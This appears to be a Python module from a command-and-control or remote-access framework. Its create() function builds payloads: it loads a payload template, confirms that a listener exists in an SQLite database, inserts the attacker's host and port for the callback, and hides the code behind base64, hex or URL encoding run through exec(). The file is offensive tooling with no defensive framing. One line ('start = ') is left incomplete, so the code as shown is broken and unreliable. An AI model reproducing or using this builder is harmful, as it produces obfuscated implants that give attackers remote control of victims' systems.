from binascii import hexlify
import base64
import sqlite3
import string
import urllib.parse
def create(listener, payload, address, port, encoder):
    """
    Create a payload 
    """
    try:
        with open("Payloads/" + payload + ".py", "r") as f:
            payload = f.read()
    except:
        raise Exception("Could not find the payload")
    # Check if Listener exists
    conn = sqlite3.connect("Data/db.sqlite3")
    curr = conn.cursor()
    curr.execute("SELECT * FROM Listeners WHERE Id = ?", (listener,))
    if curr.fetchone() is None:
        raise Exception("Could not find the listener")
    # Randomize the Payload
    start = 
    finished_payload = f"HOST = '{address}'\nPORT = {port}\n" + payload
    if encoder == "base64":
        finished_payload = """import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(finished_payload.encode()).decode()
    elif encoder == "hex":
        finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(finished_payload.encode()).decode()
    elif encoder == "url":
        finished_payload = """import urllib.parse;exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(finished_payload)
    elif encoder == "raw":
        finished_payload = """exec(b'%s')""" % finished_payload.encode()
    return finished_payload
